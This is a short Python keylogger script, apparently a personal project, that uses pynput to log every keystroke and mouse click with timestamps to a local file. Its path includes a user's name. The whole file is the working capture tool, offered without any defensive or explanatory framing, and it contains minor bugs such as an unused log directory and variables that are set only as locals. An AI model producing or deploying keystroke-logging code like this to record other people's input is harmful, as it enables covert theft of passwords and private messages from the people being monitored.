from pynput import keyboard
from pynput import mouse
import logging
import datetime

log_dir = "C:/Users/Cassandra McCormack/Key Logger"
logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

lastTime = 0
lastKey = 0

def on_press(key):
    lastKey = str(key)
    thisTime = datetime.datetime.now().time()
    print(thisTime)
    logging.info(str(key))
    lastTime = thisTime

def on_click(x, y, button, pressed):
    if pressed:
        logging.info(str(button))
        print (button)

#allows mouse and keyboard listeners to be used concurrently
with mouse.Listener(on_click=on_click) as listener:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

